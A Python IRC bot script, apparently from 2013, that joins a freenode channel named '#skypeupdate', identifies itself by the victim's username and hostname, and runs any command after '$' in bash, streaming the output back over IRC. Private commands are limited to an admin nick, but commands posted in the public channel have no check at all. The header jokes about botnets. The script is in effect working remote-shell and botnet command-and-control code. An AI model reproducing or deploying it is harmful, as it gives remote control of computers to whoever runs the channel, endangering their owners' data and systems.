# -*- coding: utf-8 -*-
# based on this awesome dude's code: chevloschelios (http://ubuntuforums.org/showthread.php?t=1493702)
# Nick Sweeting © 2013
# share and share alike blah blah blah but for godsakes dont credit me, i dont want to get arrested if you make a botnet using this (dont)

import socket
import getpass
import random
import signal
import os
import subprocess
from subprocess import Popen, PIPE, STDOUT
import time
from time import strftime, sleep

version = 0.3

def log(prefix, content=''):
   try:
      for line in content.split('\n'):
         print('[%s] %s%s' % (strftime("%Y-%m-%d %H:%M:%S"), prefix, line))
   except:
      print('[%s] %s%s' % (strftime("%Y-%m-%d %H:%M:%S"), prefix, content))

log("[*] IRC BOT v%s" % version)

############ Variables

server = 'irc.freenode.net'                                        # IRC server to connect to
port = 6667                                                        # you really shouldnt need these comments
channel = '#skypeupdate'                                                      # duh
admin = 'thesquash'                                                # the nick of the master of bots!

hostname = socket.gethostname()
local_user = getpass.getuser()

#nick = 'thesquashbot'                                              # final format will be [username|hostname]rand, boy do i wish IRC allowed nicks with @ characters
nick = '[%s|%s]' % (local_user, hostname)

helpmsg = 'Version: v%s\n\
Available Commands: \n\
 1. !quit          #-- shutdown the bot \n\
 2. !reload        #-- reconnect to IRC \n\
 3. public         #-- generic keyword for testing\n\
 4. private        #-- generic keyword for testing\n\
 5. help           #-- display this message\n\
 6. $<command>     #-- run <command> in shell and capture live output\n\
 7. !cancel        #-- stop grabbing running command output\n' % version

############ IRC functions

def line_split(seq, n):
   output = []
   if (seq.find('\n') == -1):
      output.append(seq)
   else:
      while (seq.find('\n') != -1):
         output.append(seq.split("\n", 1)[0])
         seq = seq.split("\n", 1)[1]
   splitout = []
   for line in output:
      while line:
         splitout.append(line[:n])
         line = line[n:]
   return splitout

def scan(match):                                                  # function to scan main channel messages for strings
   if data.find(channel) != -1 and not data.find(nick) != -1:     # checking to make sure its not a private message
      return data.find(match) != -1
   else:
      return False

def privscan(match):                                              # function to scan private messages to the bot for strings
   if data.find('PRIVMSG %s :%s' % (nick, match)) != -1:
      header = data.split("PRIVMSG")[0]
      return header.find(':%s!' % admin) != -1                    # checks to make sure private message is from admin

def handler(signum, frame):
   raise Exception("timedout")

def privmsg(msg=None, to=admin):                                  # function to send a private message to a user, defaults to master of bots!
   log('[+] Sent Data:')
   if (len(msg) > 480) or (msg.find('\n') != -1):
      log('[#] Starting multiline output.')
      msgs = line_split(msg, 480)
      total = len(msgs)
      for num, line in enumerate(msgs):
         log('[<]    PRIVMSG %s :[%s/%s] %s\r' % (to, num+1, total, line))
         irc.send ('PRIVMSG %s :[%s/%s] %s\r\n' % (to, num+1, total, line))
         sleep(1)
      log('[#] Finished multiline output.')  
   else:
      log('[<]    PRIVMSG %s :%s\r' % (to, msg))
      irc.send ('PRIVMSG %s :%s\r\n' % (to, msg))

def broadcast(msg):                                               # function to send a message to the main channel
   privmsg(msg, channel)

def run(cmd, respond_method='priv'):
   def respond(content):
      if (respond_method == 'pub'):
         broadcast(content)
      else:
         privmsg(content)

   out = ''
   cmd = cmd.strip()
   respond('[$] %s' % cmd)
   log("[+] Ran Command:")
   log("[$]   CMD: ", [cmd])
   signal.signal(signal.SIGALRM, handler)
   signal.alarm(5)
   try:
      p = subprocess.Popen([cmd],shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, executable='/bin/bash')
      log("[$]   Started.")
      run = 1
   except Exception as e:
      respond("Failed: %s" % e)
      out += "Failed: %s" % e
      run = 0
   signal.alarm(0)
   while(run):
      signal.signal(signal.SIGALRM, handler)
      signal.alarm(4)
      try:
         signal.signal(signal.SIGALRM, handler)
         signal.alarm(2)
         try:
            line = p.stdout.readline()
            respond(line)
            out += line
         except:
            log('[#] Checking for input.')
         data = irc.recv ( 4096 )
         log('[+] Recieved:')
         log('[>]    ', data)
         if (data.find('!cancel') != -1):
            run = 0
            retcode = "Cancelled."
            respond("[X]: %s" % retcode)
            os.killpg(p.pid, signal.SIGTERM)
            break
         else:
            retcode = p.poll() #returns None while subprocess is running
      except Exception as e:
         retcode = p.poll() #returns None while subprocess is running
         log('[#] Done Checking.')
      signal.alarm(0)
      if (retcode is not None):
         line = p.stdout.read()
         respond(line)
         out += line
         out += "[$] Exit Status: %s" % retcode
         if (retcode != 0):
            respond("[X]: %s" % retcode)
         else:
            respond("[√]")
         run = 0
         break
   log('[#] Done.')
      

   split = line_split(out, 480)
   ttl = len(split)
   for idx, line in enumerate(split):
      log("[>]   OUT [%s/%s]: " % (idx+1,ttl), line)
      log("\n")

############The beef of things
if len(nick) > 15: nick = '[%s]' % (local_user[:13])
last_ping = time.time()
threshold = 5 * 60
quit_status = False
while not quit_status:
   timeout_count = 0
   last_data = data = ''
   log("[+] Connecting...")
   log("[<]    Nick:        ", nick)
   log("[<]    Server:      ", server+':'+str(port))
   log("[<]    Room:        ", channel)
   try:
      irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      irc.settimeout(60)
      irc.connect((server, port))
      recv = irc.recv ( 4096 )
      log("[+] Recieved:    ", recv+'\n')
      irc.send ('NICK %s\r\n' % nick )
      irc.send ('USER %s %s %s :%s\r\n' % (nick, nick, nick, nick))
      irc.send ('JOIN %s\r\n' % channel)
      irc.send ('PRIVMSG %s :Bot v%s Running.\r\n' % (admin, version))
   except Exception as error:
      log('[*] Connection Failed: ')
      log('[X]    ',error)
      timeout_count = 50
      sleep(10)

   while not quit_status and (timeout_count < 50):
      if (last_data == data):
         timeout_count += 1
      try:
         data = irc.recv ( 4096 )
         log('[+] Recieved:')
         log('[>]    ', data)
      except socket.timeout:
         if (time.time() - last_ping) > threshold:
            log('[*] Disconnected.')
            timedout_count = 50
            break
         else:
            data = str(time.time())
            pass

      if data.find ('PING') != -1:                                     # im warning you, dont touch this bit
         irc.send ('PONG ' + data.split()[1] + '\r')
         last_ping = time.time()
         log('[>]    PONG ' + data.split()[1] + '\r')
         timeout_count = 0    

      elif data.find('Nickname is already in use') != -1:
         nick += str(random.randint(1,200))
         if len(nick) > 15: nick = '[%s]%s' % (local_user[:11], random.randint(1,99))
         timeout_count = 50

      elif scan('!quit') or privscan('quit'):
         privmsg('Quitting.')
         irc.send ( 'QUIT\r\n' )
         quit_status = True

      elif scan('!reload') or privscan('reload'):
         privmsg('Reloading.')
         irc.send ( 'QUIT\r\n' )
         break

      elif scan('public'):
         broadcast('Registered public keyword.')

      elif privscan('private'):
         privmsg('Registered private keyword.')

      elif privscan('help'):
         privmsg(helpmsg)

      elif scan('help'):
         broadcast(helpmsg)

      elif scan('$'):
         cmd = data.split("$")[1]
         run(cmd, 'pub')

      elif privscan('$'):
         cmd = data.split("$")[1]
         run(cmd, 'priv')

      last_data = data

log("[*] EXIT")